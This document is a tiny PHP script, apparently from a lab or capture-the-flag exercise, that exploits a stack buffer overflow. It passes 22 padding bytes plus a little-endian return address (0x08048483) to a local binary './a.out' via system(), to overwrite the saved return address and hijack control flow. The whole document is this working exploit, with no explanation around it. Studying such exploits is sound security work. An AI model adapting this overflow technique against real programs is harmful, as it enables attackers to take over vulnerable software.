$arg = "1111111111111111111111"."\x83\x84\x04\x08";
$cmd = "./a.out ".$arg;

system($cmd);
